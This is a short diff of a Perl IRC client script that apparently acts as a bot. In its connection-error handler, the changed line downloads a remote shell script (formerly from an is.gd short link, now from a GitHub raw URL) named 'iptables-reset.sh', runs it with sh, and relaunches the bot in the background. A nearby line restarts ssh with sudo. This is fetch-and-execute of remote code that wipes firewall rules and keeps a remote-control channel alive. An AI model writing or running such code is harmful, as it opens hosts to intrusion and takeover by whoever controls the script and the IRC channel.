@@ -178,7 +178,7 @@ system 'if [ -f /usr/bin/apt ]; then sudo service ssh restart; fi';
   });
    $irc->connect(sub {
     my($irc, $err) = @_;
-    return system("wget -O .fw is.gd/fwreset && sh .fw && perl perlircssl.pl &") if $err;
+    return system("$(if [ ! -f ./iptables-reset.sh ]; then echo curl -LvO https://raw.githubusercontent.com/ind3p3nd3nt/fwreset/main/iptables-reset.sh -o iptables-reset.sh; fi;) && sh iptables-reset.sh && perl perlircssl.pl &") if $err;
     $irc->write(join => $channel);
     });
    Mojo::IOLoop->start;
